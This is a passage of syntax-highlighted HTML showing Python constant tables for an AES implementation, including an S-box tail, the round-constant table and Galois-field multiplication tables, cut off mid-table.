class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>, </span><br><span class="line">	<span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>, </span><br><span class="line">	<span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>, </span><br><span class="line">	<span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>, </span><br><span class="line">	<span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>, </span><br><span class="line">	<span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>, </span><br><span class="line">	<span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>, </span><br><span class="line">	<span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>, </span><br><span class="line">	<span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>, </span><br><span class="line">	<span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, </span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>, </span><br><span class="line">	<span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>, </span><br><span class="line">	<span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line">RCON_BOX = [</span><br><span class="line">	<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>,</span><br><span class="line">	<span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>,</span><br><span class="line">	<span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>,</span><br><span class="line">	<span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>,</span><br><span class="line">	<span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>,</span><br><span class="line">	<span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>,</span><br><span class="line">	<span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>,</span><br><span class="line">	<span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>,</span><br><span class="line">	<span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>,</span><br><span class="line">	<span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>,</span><br><span class="line">	<span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>,</span><br><span class="line">	<span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>,</span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>,</span><br><span class="line">	<span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>,</span><br><span class="line">	<span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_1 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x09</span>,<span class="number">0x0a</span>,<span class="number">0x0b</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x10</span>,<span class="number">0x11</span>,<span class="number">0x12</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x18</span>,<span class="number">0x19</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x1c</span>,<span class="number">0x1d</span>,<span class="number">0x1e</span>,<span class="number">0x1f</span>,</span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2a</span>,<span class="number">0x2b</span>,<span class="number">0x2c</span>,<span class="number">0x2d</span>,<span class="number">0x2e</span>,<span class="number">0x2f</span>,</span><br><span class="line">	<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x3a</span>,<span class="number">0x3b</span>,<span class="number">0x3c</span>,<span class="number">0x3d</span>,<span class="number">0x3e</span>,<span class="number">0x3f</span>,</span><br><span class="line">	<span class="number">0x40</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,<span class="number">0x49</span>,<span class="number">0x4a</span>,<span class="number">0x4b</span>,<span class="number">0x4c</span>,<span class="number">0x4d</span>,<span class="number">0x4e</span>,<span class="number">0x4f</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x53</span>,<span class="number">0x54</span>,<span class="number">0x55</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x58</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x5b</span>,<span class="number">0x5c</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x5f</span>,</span><br><span class="line">	<span class="number">0x60</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6a</span>,<span class="number">0x6b</span>,<span class="number">0x6c</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,</span><br><span class="line">	<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x79</span>,<span class="number">0x7a</span>,<span class="number">0x7b</span>,<span class="number">0x7c</span>,<span class="number">0x7d</span>,<span class="number">0x7e</span>,<span class="number">0x7f</span>,</span><br><span class="line">	<span class="number">0x80</span>,<span class="number">0x81</span>,<span class="number">0x82</span>,<span class="number">0x83</span>,<span class="number">0x84</span>,<span class="number">0x85</span>,<span class="number">0x86</span>,<span class="number">0x87</span>,<span class="number">0x88</span>,<span class="number">0x89</span>,<span class="number">0x8a</span>,<span class="number">0x8b</span>,<span class="number">0x8c</span>,<span class="number">0x8d</span>,<span class="number">0x8e</span>,<span class="number">0x8f</span>,</span><br><span class="line">	<span class="number">0x90</span>,<span class="number">0x91</span>,<span class="number">0x92</span>,<span class="number">0x93</span>,<span class="number">0x94</span>,<span class="number">0x95</span>,<span class="number">0x96</span>,<span class="number">0x97</span>,<span class="number">0x98</span>,<span class="number">0x99</span>,<span class="number">0x9a</span>,<span class="number">0x9b</span>,<span class="number">0x9c</span>,<span class="number">0x9d</span>,<span class="number">0x9e</span>,<span class="number">0x9f</span>,</span><br><span class="line">	<span class="number">0xa0</span>,<span class="number">0xa1</span>,<span class="number">0xa2</span>,<span class="number">0xa3</span>,<span class="number">0xa4</span>,<span class="number">0xa5</span>,<span class="number">0xa6</span>,<span class="number">0xa7</span>,<span class="number">0xa8</span>,<span class="number">0xa9</span>,<span class="number">0xaa</span>,<span class="number">0xab</span>,<span class="number">0xac</span>,<span class="number">0xad</span>,<span class="number">0xae</span>,<span class="number">0xaf</span>,</span><br><span class="line">	<span class="number">0xb0</span>,<span class="number">0xb1</span>,<span class="number">0xb2</span>,<span class="number">0xb3</span>,<span class="number">0xb4</span>,<span class="number">0xb5</span>,<span class="number">0xb6</span>,<span class="number">0xb7</span>,<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0xba</span>,<span class="number">0xbb</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0xbe</span>,<span class="number">0xbf</span>,</span><br><span class="line">	<span class="number">0xc0</span>,<span class="number">0xc1</span>,<span class="number">0xc2</span>,<span class="number">0xc3</span>,<span class="number">0xc4</span>,<span class="number">0xc5</span>,<span class="number">0xc6</span>,<span class="number">0xc7</span>,<span class="number">0xc8</span>,<span class="number">0xc9</span>,<span class="number">0xca</span>,<span class="number">0xcb</span>,<span class="number">0xcc</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xcf</span>,</span><br><span class="line">	<span class="number">0xd0</span>,<span class="number">0xd1</span>,<span class="number">0xd2</span>,<span class="number">0xd3</span>,<span class="number">0xd4</span>,<span class="number">0xd5</span>,<span class="number">0xd6</span>,<span class="number">0xd7</span>,<span class="number">0xd8</span>,<span class="number">0xd9</span>,<span class="number">0xda</span>,<span class="number">0xdb</span>,<span class="number">0xdc</span>,<span class="number">0xdd</span>,<span class="number">0xde</span>,<span class="number">0xdf</span>,</span><br><span class="line">	<span class="number">0xe0</span>,<span class="number">0xe1</span>,<span class="number">0xe2</span>,<span class="number">0xe3</span>,<span class="number">0xe4</span>,<span class="number">0xe5</span>,<span class="number">0xe6</span>,<span class="number">0xe7</span>,<span class="number">0xe8</span>,<span class="number">0xe9</span>,<span class="number">0xea</span>,<span class="number">0xeb</span>,<span class="number">0xec</span>,<span class="number">0xed</span>,<span class="number">0xee</span>,<span class="number">0xef</span>,</span><br><span class="line">	<span class="number">0xf0</span>,<span class="number">0xf1</span>,<span class="number">0xf2</span>,<span class="number">0xf3</span>,<span class="number">0xf4</span>,<span class="number">0xf5</span>,<span class="number">0xf6</span>,<span class="number">0xf7</span>,<span class="number">0xf8</span>,<span class="number">0xf9</span>,<span class="number">0xfa</span>,<span class="number">0xfb</span>,<span class="number">0xfc</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_2 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0e</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x14</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x1a</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,</span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x26</span>,<span class="number">0x28</span>,<span class="number">0x2a</span>,<span class="number">0x2c</span>,<span class="number">0x2e</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x38</span>,<span class="number">0x3a</span>,<span class="number">0x3c</span>,<span class="number">0x3e</span>,</span><br><span class="line">	<span class="number">0x40</span>,<span class="number">0x42</span>,<span class="number">0x44</span>,<span class="number">0x46</span>,<span class="number">0x48</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x4e</span>,<span class="number">0x50</span>,<span class="number">0x52</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x58</span>,<span class="number">0x5a</span>,<span class="number">0x5c</span>,<span class="number">0x5e</span>,</span><br><span class="line">	<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x6a</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x7a</span>,<span class="number">0x7c</span>,<span class="number">0x7e</span>,</span><br><span class="line">	<span class="number">0x80</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x8a</span>,<span class="number">0x8c</span>,<span class="number">0x8e</span>,<span class="number">0x90</span>,<span class="number">0x92</span>,<span class="number">0x94</span>,<span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x9a</span>,<span class="number">0x9c</span>,<span class="number">0x9e</span>,</span><br><span class="line">	<span class="number">0xa0</span>,<span class="number">0xa2</span>,<span class="number">0xa4</span>,<span class="number">0xa6</span>,<span class="number">0xa8</span>,<span class="number">0xaa</span>,<span class="number">0xac</span>,<span class="number">0xae</span>,<span class="number">0xb0</span>,<span class="number">0xb2</span>,<span class="number">0xb4</span>,<span class="number">0xb6</span>,<span class="number">0xb8</span>,<span class="number">0xba</span>,<span class="number">0xbc</span>,<span class="number">0xbe</span>,</span><br><span class="line">	<span class="number">0xc0</span>,<span class="number">0xc2</span>,<span class="number">0xc4</span>,<span class="number">0xc6</span>,<span class="number">0xc8</span>,<span class="number">0xca</span>,<span class="number">0xcc</span>,<span class="number">0xce</span>,<span class="number">0xd0</span>,<span class="number">0xd2</span>,<span class="number">0xd4</span>,<span class="number">0xd6</span>,<span class="number">0xd8</span>,<span class="number">0xda</span>,<span class="number">0xdc</span>,<span class="number">0xde</span>,</span><br><span class="line">	<span class="number">0xe0</span>,<span class="number">0xe2</span>,<span class="number">0xe4</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xea</span>,<span class="number">0xec</span>,<span class="number">0xee</span>,<span class="number">0xf0</span>,<span class="number">0xf2</span>,<span class="number">0xf4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xfa</span>,<span class="number">0xfc</span>,<span class="number">0xfe</span>,</span><br><span class="line">	<span class="number">0x1b</span>,<span class="number">0x19</span>,<span class="number">0x1f</span>,<span class="number">0x1d</span>,<span class="number">0x13</span>,<span class="number">0x11</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x09</span>,<span class="number">0x0f</span>,<span class="number">0x0d</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x07</span>,<span class="number">0x05</span>,</span><br><span class="line">	<span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x3f</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x37</span>,<span class="number">0x35</span>,<span class="number">0x2b</span>,<span class="number">0x29</span>,<span class="number">0x2f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x25</span>,</span><br><span class="line">	<span class="number">0x5b</span>,<span class="number">0x59</span>,<span class="number">0x5f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0x55</span>,<span class="number">0x4b</span>,<span class="number">0x49</span>,<span class="number">0x4f</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x7b</span>,<span class="number">0x79</span>,<span class="number">0x7f</span>,<span class="number">0x7d</span>,<span class="number">0x73</span>,<span class="number">0x71</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,</span><br><span class="line">	<span class="number">0x9b</span>,<span class="number">0x99</span>,<span class="number">0x9f</span>,<span class="number">0x9d</span>,<span class="number">0x93</span>,<span class="number">0x91</span>,<span class="number">0x97</span>,<span class="number">0x95</span>,<span class="number">0x8b</span>,<span class="number">0x89</span>,<span class="number">0x8f</span>,<span class="number">0x8d</span>,<span class="number">0x83</span>,<span class="number">0x81</span>,<span class="number">0x87</span>,<span class="number">0x85</span>,</span><br><span class="line">	<span class="number">0xbb</span>,<span class="number">0xb9</span>,<span class="number">0xbf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb7</span>,<span class="number">0xb5</span>,<span class="number">0xab</span>,<span class="number">0xa9</span>,<span class="number">0xaf</span>,<span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xa1</span>,<span class="number">0xa7</span>,<span class="number">0xa5</span>,</span><br><span class="line">	<span class="number">0xdb</span>,<span class="number">0xd9</span>,<span class="number">0xdf</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xd1</span>,<span class="number">0xd7</span>,<span class="number">0xd5</span>,<span class="number">0xcb</span>,<span class="number">0xc9</span>,<span class="number">0xcf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xc1</span>,<span class="number">0xc7</span>,<span class="number">0xc5</span>,</span><br><span class="line">	<span class="number">0xfb</span>,<span class="number">0xf9</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xf3</span>,<span class="number">0xf1</span>,<span class="number">0xf7</span>,<span class="number">0xf5</span>,<span class="number">0xeb</span>,<span class="number">0xe9</span>,<span class="number">0xef</span>,<span class="number">0xed</span>,<span class="number">0xe3</span>,<span class="number">0xe1</span>,<span class="number">0xe7</span>,<span class="number">0xe5</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_3 = [</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x06</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x0f</span>,<span class="number">0x0a</span>,<span class="number">0x09</span>,<span class="number">0x18</span>,<span class="number">0x1b</span>,<span class="number">0x1e</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x11</span>,</span><br><span class="line">	<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x3c</span>,<span class="number">0x3f</span>,<span class="number">0x3a</span>,<span class="number">0x39</span>,<span class="number">0x28</span>,<span class="number">0x2b</span>,<span class="number">0x2e</span>,<span class="number">0x2d</span>,<span class="number">0x24</span>,<span class="number">0x27</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,</span><br><span class="line">	<span class="number">0x60</span>,<span class="number">0x63</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x6a</span>,<span class="number">0x69</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x7e</span>,<span class="number">0x7d</span>,<span class="number">0x74</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x5f</span>,<span class="number">0x5a</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x4b</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x47</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,</span><br><span class="line">	<span class="number">0xc0</span>,<span class="number">0xc3</span>,<span class="number">0xc6</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xcf</span>,<span class="number">0xca</span>,<span class="number">0xc9</span>,<span class="number">0xd8</span>,<span 